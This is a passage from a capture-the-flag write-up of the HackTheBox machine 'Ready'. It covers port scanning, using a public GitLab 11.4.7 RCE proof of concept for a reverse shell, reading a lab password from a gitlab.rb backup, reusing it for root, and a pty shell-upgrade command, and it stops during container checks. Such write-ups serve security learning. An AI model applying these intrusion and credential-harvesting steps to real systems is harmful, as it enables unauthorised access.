<html>
	<head>
		<title>Ready</title>
		<meta name="description" content="Basically the Laboratory HTB box but easier..." />
		<meta name="robots" content="index, follow" />
		<meta property="og:title" content="Ready" />
		<meta property="og:site_name" content="GhostCcamm's Cyber Misadventures" />
		<meta property="og:description" content="Basically the Laboratory HTB box but easier..." />
		
        <meta property="og:image" content="/images/writeups/htb_machines/ready/ready.png" />
    
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="/assets/css/main.css" />
		<link rel="stylesheet" href="/assets/css/styles.css" />
		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Page Wrapper -->
			<div id="page-wrapper">

			<!-- Header -->
				<header id="header" class="alt">
					<h1><a href="index.html">GhostCcamm's Cyber Misadventures</a></h1>
					<nav>
						<a href="#menu">Menu</a>
					</nav>
				</header>

			<!-- Menu -->
				<nav id="menu">
					<div class="inner">
						<h2>Menu</h2>
						<ul class="links">
							<li><a href="/">Home</a></li>
							<li><a href="/blog">Blog</a></li>
							<li><a href="/writeups">Write Ups</a></li>
						</ul>
						<a href="#" class="close">Close</a>
					</div>
				</nav>

			<!-- Banner -->
		    <section id="banner">
		      <div class="inner">
		        <div class="logo"><div class="image"><img src="/images/logo.png" alt="" width="75" height="75" /></div></div>
		        <h2>Ready</h2>
						<p class="date">2020-12-24</p>
		        <p>Basically the Laboratory HTB box but easier..."</p>
		      </div>
		    </section>

      <section id="wrapper">
<section class="wrapper spotlight style5 ">
<div class="inner">
<div class="main_image"><img src=/images/writeups/htb_machines/ready/ready.png alt="" /></div>
<div class="content">
<h2 class="major" id="overview">
 Overview
</h2>
<p>
 HackTheBox staff have definitely been relishing slamming GitLab these past few months. First we got Laboratory that was vulnerable to Local File Inclusion (LFI) to Remote Code Execution (RCE) and then we got the box we are covering today, Ready.
</p>
<p>
 The initial attack vector just goes straight to RCE (no fluffing around with cookie deserialization like in Laboratory), followed by a little bit of enumeration to eventually escape from a Docker container.
</p>
</div>
</div>
</section>
<section class="wrapper style4 alt">
<div class="inner">
<div class="content">

<h2 class="major" id="initial-foothold">
 Initial Foothold
</h2>
<p>
 Like always you start with a port scan as the first step of enumeration. You could try the hardcore method and just blindly guess random port numbers (to be fair this might work for a chunk of boxes). However, that strategy would of taken incredible amount of time for this box, since I found a service running on port 5080 that was running GitLab
 <em>
  (again...)
 </em>
 .
</p>
<div class="codehilite">
 <pre><span></span><code><span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">91</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2020-12-22</span><span class="w"> </span><span class="nt">13</span><span class="p">:</span><span class="nd">03</span><span class="w"> </span><span class="nt">AWST</span><span class="w"></span>
<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">ready</span><span class="p">.</span><span class="nc">htb</span><span class="w"> </span><span class="o">(</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">220</span><span class="o">)</span><span class="w"></span>
<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">059s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span><span class="w"></span>

<span class="nt">PORT</span><span class="w">     </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span><span class="w"></span>
<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">8</span><span class="p">.</span><span class="nc">2p1</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"></span>
<span class="o">|</span><span class="w">   </span><span class="nt">3072</span><span class="w"> </span><span class="nt">48</span><span class="p">:</span><span class="nd">ad</span><span class="p">:</span><span class="nd">d5</span><span class="p">:</span><span class="nd">b8</span><span class="p">:</span><span class="nd">3a</span><span class="p">:</span><span class="nd">9f</span><span class="p">:</span><span class="nd">bc</span><span class="p">:</span><span class="nd">be</span><span class="p">:</span><span class="nd">f7</span><span class="p">:</span><span class="nd">e8</span><span class="p">:</span><span class="nd">20</span><span class="p">:</span><span class="nd">1e</span><span class="p">:</span><span class="nd">f6</span><span class="p">:</span><span class="nd">bf</span><span class="p">:</span><span class="nd">de</span><span class="p">:</span><span class="nd">ae</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">b7</span><span class="p">:</span><span class="nd">89</span><span class="p">:</span><span class="nd">6c</span><span class="p">:</span><span class="nd">0b</span><span class="p">:</span><span class="nd">20</span><span class="p">:</span><span class="nd">ed</span><span class="p">:</span><span class="nd">49</span><span class="p">:</span><span class="nd">b2</span><span class="p">:</span><span class="nd">c1</span><span class="p">:</span><span class="nd">86</span><span class="p">:</span><span class="nd">7c</span><span class="p">:</span><span class="nd">29</span><span class="p">:</span><span class="nd">92</span><span class="p">:</span><span class="nd">74</span><span class="p">:</span><span class="nd">1c</span><span class="p">:</span><span class="nd">1f</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">256</span><span class="w"> </span><span class="nt">18</span><span class="p">:</span><span class="nd">cd</span><span class="p">:</span><span class="nd">9d</span><span class="p">:</span><span class="nd">08</span><span class="p">:</span><span class="nd">a6</span><span class="p">:</span><span class="nd">21</span><span class="p">:</span><span class="nd">a8</span><span class="p">:</span><span class="nd">b8</span><span class="p">:</span><span class="nd">b6</span><span class="p">:</span><span class="nd">f7</span><span class="p">:</span><span class="nd">9f</span><span class="p">:</span><span class="nd">8d</span><span class="p">:</span><span class="nd">40</span><span class="p">:</span><span class="nd">51</span><span class="p">:</span><span class="nd">54</span><span class="p">:</span><span class="nd">fb</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span><span class="w"></span>
<span class="nt">5080</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">nginx</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="nt">http-robots</span><span class="p">.</span><span class="nc">txt</span><span class="o">:</span><span class="w"> </span><span class="nt">53</span><span class="w"> </span><span class="nt">disallowed</span><span class="w"> </span><span class="nt">entries</span><span class="w"> </span><span class="o">(</span><span class="nt">15</span><span class="w"> </span><span class="nt">shown</span><span class="o">)</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="nt">autocomplete</span><span class="o">/</span><span class="nt">users</span><span class="w"> </span><span class="o">/</span><span class="nt">search</span><span class="w"> </span><span class="o">/</span><span class="nt">api</span><span class="w"> </span><span class="o">/</span><span class="nt">admin</span><span class="w"> </span><span class="o">/</span><span class="nt">profile</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="nt">dashboard</span><span class="w"> </span><span class="o">/</span><span class="nt">projects</span><span class="o">/</span><span class="nt">new</span><span class="w"> </span><span class="o">/</span><span class="nt">groups</span><span class="o">/</span><span class="nt">new</span><span class="w"> </span><span class="o">/</span><span class="nt">groups</span><span class="c">/*/edit /users /help</span>
<span class="c">|_/s/ /snippets/new /snippets/*/</span><span class="nt">edit</span><span class="w"></span>
<span class="o">|</span><span class="w"> </span><span class="nt">http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Sign</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="err">\</span><span class="nt">xC2</span><span class="err">\</span><span class="nt">xB7</span><span class="w"> </span><span class="nt">GitLab</span><span class="w"></span>
<span class="o">|</span><span class="nt">_Requested</span><span class="w"> </span><span class="nt">resource</span><span class="w"> </span><span class="nt">was</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">ready</span><span class="p">.</span><span class="nc">htb</span><span class="p">:</span><span class="nd">5080</span><span class="o">/</span><span class="nt">users</span><span class="o">/</span><span class="nt">sign_in</span><span class="w"></span>
<span class="o">|</span><span class="nt">_http-trane-info</span><span class="o">:</span><span class="w"> </span><span class="nt">Problem</span><span class="w"> </span><span class="nt">with</span><span class="w"> </span><span class="nt">XML</span><span class="w"> </span><span class="nt">parsing</span><span class="w"> </span><span class="nt">of</span><span class="w"> </span><span class="o">/</span><span class="nt">evox</span><span class="o">/</span><span class="nt">about</span><span class="w"></span>
<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span><span class="w"></span>

<span class="nt">Service</span><span class="w"> </span><span class="nt">detection</span><span class="w"> </span><span class="nt">performed</span><span class="o">.</span><span class="w"> </span><span class="nt">Please</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">any</span><span class="w"> </span><span class="nt">incorrect</span><span class="w"> </span><span class="nt">results</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">submit</span><span class="o">/</span><span class="w"> </span><span class="o">.</span><span class="w"></span>
<span class="nt">Nmap</span><span class="w"> </span><span class="nt">done</span><span class="o">:</span><span class="w"> </span><span class="nt">1</span><span class="w"> </span><span class="nt">IP</span><span class="w"> </span><span class="nt">address</span><span class="w"> </span><span class="o">(</span><span class="nt">1</span><span class="w"> </span><span class="nt">host</span><span class="w"> </span><span class="nt">up</span><span class="o">)</span><span class="w"> </span><span class="nt">scanned</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">14</span><span class="p">.</span><span class="nc">59</span><span class="w"> </span><span class="nt">seconds</span><span class="w"></span>
</code></pre>
</div>
<p>
 The first thing I tried was the LFI to RCE exploit that was the foothold vector for Laboratory. Unfortunately, I did not start this box sooner and HTB staff had already patched those vulnerabilities (from what I heard reading the forum).
</p>
<p>
 However, navigating to
 <code>
  http://ready.htb:5080/help
 </code>
 while authenticated revealed that the GitLab version was 11.4.7, which is vulnerable to RCE!
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/ready/gitlab_version.png"/>
</p>
<p>
 Our Holy Cyber Security Messiah LiveOverflow has gifted all of us both an amazing
 <a href="https://www.youtube.com/watch?v=LrLJuyAdoAg">
  video
 </a>
 and
 <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">
  blog article
 </a>
 explaining this vulnerability in far better detail than I could.
</p>
<p>
 <strong>
  TLDR
 </strong>
 : The RCE is triggered by targeting redis using Server Side Request Forgery (SSRF) and Carriage-Return/Line-Feed (CRLF) injection.
</p>
<p>
 I was feeling a bit lazy so I found a
 <a href="https://github.com/mohinparamasivam/GitLab-11.4.7-Authenticated-Remote-Code-Execution">
  Proof of Concept (PoC) on Github
 </a>
 and made some modifications so it actually worked. I removed the unnecessary headers, proxy routing for Burp Suite and changed the payload so it gave me a TTY reverse shell; just the classic anti-script kiddy shenanigans.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/ready/initial_foothold.png"/>
</p>
<p>
 <em>
  Bingo we are in!
 </em>
</p>
</div>
</div>
</section>
<section class="wrapper style2 ">
<div class="inner">
<div class="content">

<h2 class="major" id="getting-the-user-flag">
 Getting the User Flag
</h2>
<p>
 I went to
 <code>
  /home/dude
 </code>
 and ran
 <code>
  ls -al
 </code>
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">dude</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
<span class="n">total</span><span class="w"> </span><span class="mi">24</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">58</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
<span class="n">lrwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="mi">9</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">58</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="n">dude</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">31</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="mi">3771</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">31</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">dude</span><span class="w"> </span><span class="n">dude</span><span class="w">  </span><span class="mi">655</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="mi">16</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span><span class="w"></span>
<span class="o">-</span><span class="n">r</span><span class="c1">--r----- 1 dude git    33 Dec  2 10:46 user.txt</span>
</code></pre>
</div>
<p>
 Oh neat, I am part of the group
 <code>
  git
 </code>
 ! Let's just get the flag.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">dude</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
<span class="n">e1e30b052b6ec0670698805d745e7682</span><span class="w"></span>
</code></pre>
</div>
<p>
 <em>
  Super hard!
 </em>
</p>
</div>
</div>
</section>
<section class="wrapper style1 alt">
<div class="inner">
<div class="content">

<h2 class="major" id="getting-root-fake-root">
 Getting
 <s>
  Root
 </s>
 Fake Root
</h2>
<p>
 After spending several hours trying to get the user flag, I did the usual manual enumeration around the box. The first thing that I found that seemed
 <em>
  too good to be true
 </em>
 was the file
 <code>
  /root_pass
 </code>
 . That was a lie and I could not use it for anything.
</p>
<p>
 I continued searching and find some interesting backups at
 <code>
  /opt/backup
 </code>
 .
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
<span class="n">total</span><span class="w"> </span><span class="mi">112</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">25</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">23</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">   </span><span class="mi">872</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">25</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">15092</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">23</span><span class="w"> </span><span class="n">gitlab</span><span class="o">-</span><span class="n">secrets</span><span class="p">.</span><span class="n">json</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb</span>
</code></pre>
</div>
<p>
 Classic me, I immediately went down a rabbit hole and spent a solid 30 minutes investigating if I had to use
 <code>
  gitlab-rails
 </code>
 again because the initial root password was set in
 <code>
  docker-compose.yml
 </code>
 ...
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="ss">"gitlab_rails"</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
<span class="n">grep</span><span class="w"> </span><span class="ss">"gitlab_rails"</span><span class="w"> </span><span class="n">docker</span><span class="o">-</span><span class="n">compose</span><span class="p">.</span><span class="n">yml</span><span class="w"></span>
<span class="w">        </span><span class="n">gitlab_rails</span><span class="o">[</span><span class="n">'initial_root_password'</span><span class="o">]=</span><span class="k">File</span><span class="p">.</span><span class="k">read</span><span class="p">(</span><span class="s1">'/root_pass'</span><span class="p">)</span><span class="w"></span>
</code></pre>
</div>
<p>
 <em>
  That was another lie.
 </em>
</p>
<p>
 The whole time a sneaky password was in
 <code>
  gitlab.rb
 </code>
 . Only problem is that the file has 1853 lines, but fortunately the majority were commented. I was too lazy to go through the whole file, so I used
 <code>
  grep
 </code>
 to just filter for the uncommented lines.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="ss">"^#"</span><span class="w"> </span><span class="n">gitlab</span><span class="p">.</span><span class="n">rb</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="ss">"^$"</span><span class="w"></span>
<span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="ss">"^#"</span><span class="w"> </span><span class="n">gitlab</span><span class="p">.</span><span class="n">rb</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="ss">"^$"</span><span class="w"></span>
<span class="n">gitlab_rails</span><span class="o">[</span><span class="n">'smtp_password'</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">"wW59U!ZKMbG9+*#h"</span><span class="w"></span>
</code></pre>
</div>
<p>
 No idea why the SMTP password was the only thing set in
 <code>
  gitlab.rb
 </code>
 , besides it being the password for a different user... classic HTB move there. I could already switch users since I spawned a TTY reverse shell when I got initial, but if you do not have a TTY shell to switch users you can just run the following command.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
</code></pre>
</div>
<p>
 Checking if the password is for the
 <code>
  root
 </code>
 account gives us the treasure!
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">git</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">$</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">root</span><span class="w"></span>
<span class="n">su</span><span class="w"> </span><span class="n">root</span><span class="w"></span>
<span class="nl">Password</span><span class="p">:</span><span class="w"> </span><span class="n">wW59U</span><span class="err">!</span><span class="n">ZKMbG9</span><span class="o">+*</span><span class="n">#h</span><span class="w"></span>

<span class="n">root</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="k">backup</span><span class="err">#</span><span class="w"></span>
</code></pre>
</div>
<p>
 However...
</p>
<p>
 <strong>
  SIKE!
 </strong>
</p>
<p>
 <strong>
  THAT ROOT IS A LIE AND WE DO NOT HAVE THE FLAG!
 </strong>
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">root</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"></span>
<span class="n">total</span><span class="w"> </span><span class="mi">24</span><span class="w"></span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">06</span><span class="w"> </span><span class="p">.</span><span class="w"></span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">41</span><span class="w"> </span><span class="p">..</span><span class="w"></span>
<span class="n">lrwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="mi">9</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">56</span><span class="w"> </span><span class="p">.</span><span class="n">bash_history</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">3106</span><span class="w"> </span><span class="n">Oct</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">148</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">17</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span><span class="w"></span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="k">Dec</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">16</span><span class="err">:</span><span class="mi">49</span><span class="w"> </span><span class="p">.</span><span class="n">ssh</span><span class="w"></span>
<span class="o">-</span><span class="n">rw</span><span class="c1">------- 1 root root 1565 Dec 13 15:06 .viminfo</span>
</code></pre>
</div>
<p>
 <em>
  Looks like I have to do a bit more work :(
 </em>
</p>
</div>
</div>
</section>
<section class="wrapper style3 ">
<div class="inner">
<div class="content">

<h2 class="major" id="getting-real-root">
 Getting Real Root
</h2>
<p>
 Alright I was being a bit silly in the last section and knew beforehand that I was most likely trapped in a Docker container (
 <code>
  /.dockerenv
 </code>
 and
 <code>
  /opt/backup/docker-compose.yml
 </code>
 were fairly strong indicators). To double check that I was jailed in a container, I checked if
 <code>
  /proc/1/cgroup
 </code>
 gives me some information about where I am.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">root</span><span class="nv">@gitlab</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="k">proc</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">cgroup</span><span class="w"></span>
<span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="k">proc</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">cgroup</span><span class="w"></span>
<span class="mi">12</span><span class="err">:</span><span class="nl">perf_event</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">11</span><span class="err">:</span><span class="n">net_cls</span><span class="p">,</span><span class="nl">net_prio</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">10</span><span class="err">:</span><span class="nl">memory</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
<span class="mi">9</span><span class="err">:</span><span class="nl">blkio</span><span class="p">:</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="mi">7</span><span class="n">eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d</span><span class="w"></span>
